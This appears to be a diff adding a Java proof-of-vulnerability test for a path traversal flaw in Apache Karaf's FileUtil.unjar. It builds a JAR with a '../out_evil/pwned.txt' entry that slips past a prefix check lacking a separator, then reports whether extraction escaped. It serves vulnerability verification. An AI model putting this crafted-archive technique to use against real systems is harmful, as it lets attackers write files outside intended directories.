+/*
+ * Proof-of-Vulnerability for CWE-022 (Path Traversal) in
+ * org.apache.karaf.obr.command.util.FileUtil.unjar / copy.
+ *
+ * The containment guard in FileUtil.unjar is:
+ *     if (!target.getCanonicalPath().startsWith(dir.getCanonicalPath())) { ... }
+ * It omits the trailing File.separator, so a JAR entry that canonicalizes into a
+ * SIBLING directory sharing the same string prefix (e.g. dir="<base>/out",
+ * target="<base>/out_evil/...") passes the startsWith() check and is written
+ * OUTSIDE the intended extraction directory.
+ *
+ * This POV invokes the real project method FileUtil.unjar(JarInputStream, File)
+ * with a crafted archive and verifies that a file escapes the target directory.
+ *
+ * Exit 0  => vulnerable (escape file written outside the extraction dir)
+ * Exit 1  => not vulnerable (extraction contained / entry rejected)
+ */
+import org.apache.karaf.obr.command.util.FileUtil;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.util.jar.JarEntry;
+import java.util.jar.JarInputStream;
+import java.util.jar.JarOutputStream;
+
+public class PovPathTraversal {
+
+    public static void main(String[] args) throws Exception {
+        // Base sandbox directory.
+        File base = File.createTempFile("obr-pov", "");
+        base.delete();
+        base.mkdirs();
+
+        // The legitimate extraction target directory.
+        File dir = new File(base, "out");
+        dir.mkdirs();
+
+        // Malicious entry name: canonicalizes to <base>/out_evil/pwned.txt,
+        // a sibling of <base>/out. It escapes "dir" but still string-prefix
+        // matches dir.getCanonicalPath() == "<base>/out".
+        String maliciousEntry = "../out_evil/pwned.txt";
+
+        // Build a JAR (no manifest) containing only the malicious entry.
+        ByteArrayOutputStream jarBytes = new ByteArrayOutputStream();
+        try (JarOutputStream jos = new JarOutputStream(jarBytes)) {
+            JarEntry je = new JarEntry(maliciousEntry);
+            jos.putNextEntry(je);
+            jos.write("PWNED-BY-PATH-TRAVERSAL\n".getBytes("UTF-8"));
+            jos.closeEntry();
+        }
+
+        // The file we expect to be written if the traversal succeeds.
+        File escapeFile = new File(base, "out_evil/pwned.txt");
+
+        // Drive the real project code.
+        boolean rejected = false;
+        try (JarInputStream jis =
+                 new JarInputStream(new ByteArrayInputStream(jarBytes.toByteArray()))) {
+            FileUtil.unjar(jis, dir);
+        } catch (Exception ex) {
+            // A correct patch throws IOException rejecting the traversing entry.
+            rejected = true;
+            System.out.println("unjar rejected the entry: " + ex);
+        }
+
+        boolean escaped =
+            escapeFile.exists()
+            && !escapeFile.getCanonicalPath().startsWith(
+                    dir.getCanonicalPath() + File.separator);
+
+        System.out.println("extraction dir : " + dir.getCanonicalPath());
+        System.out.println("escape file    : " + escapeFile.getCanonicalPath());
+        System.out.println("escape written : " + escapeFile.exists());
+        System.out.println("outside dir    : " + escaped);
+
+        if (escaped && !rejected) {
+            System.out.println("VULNERABLE: JAR entry escaped the extraction directory (CWE-022).");
+            System.exit(0);
+        }
+
+        System.out.println("NOT VULNERABLE: traversal was contained/rejected.");
+        System.exit(1);
+    }
+}
